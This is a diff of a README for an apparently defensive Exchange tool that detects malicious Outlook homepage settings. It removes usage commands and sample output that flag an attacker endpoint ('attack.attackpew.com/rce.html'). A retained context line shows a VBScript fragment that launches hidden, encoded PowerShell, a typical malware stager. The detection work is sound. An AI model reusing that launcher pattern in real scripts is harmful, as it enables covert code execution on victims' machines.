@@ -97,33 +97,6 @@ CreateObject("Wscript.Shell").Run "powershell.exe -NoP -sta -NonI -W Hidden -Enc
 [+] Checking [james.smith@testdomain.com]
 ```
 
-## Homepage
-
-Amd the same again, you need to either have a list of mailboxes or a single mailbox to check. 
-
-Using the Exchange Admin account, you should be able to log into any mailbox on the Exchange server:
-
-```
-./notruler --username exchangeadmin --mailboxes /path/to/mailbox.list homepage
-```
-
-You can also check your own account by using ```--self```
-
-```
-./notruler --username john.ford@testdomain.com --mailbox john.ford@testdomain.com --self homepage
-```
-
-Sample output:
-
-```
-[+] Checking [john.ford@testdomain.com]
-[WARNING] Found endpoint: http://attack.attackpew.com/rce.html
-[+] Webview is set as ENABLED
-[+] Checking [cindy.shell@testdomain.com]
-[+] Checking [henry.hammond@testdomain.com]
-[+] Checking [james.smith@testdomain.com]
-```
-
 # IOCs
 
 I've added a list of IOC's here: [iocs.md](https://github.com/sensepost/notruler/blob/master/iocs.md)
